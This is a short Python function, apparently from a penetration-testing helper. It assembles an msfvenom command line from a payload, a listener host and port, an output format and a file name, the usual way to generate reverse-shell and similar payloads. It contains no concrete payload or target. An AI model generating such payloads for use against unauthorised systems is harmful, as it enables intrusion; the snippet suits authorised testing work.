
def build_msfvenom_cmd(payload_code, lhost, lport, file_format, output_file):
    return f"msfvenom -p {payload_code} LHOST={lhost} LPORT={lport} -f {file_format} -o {output_file}"
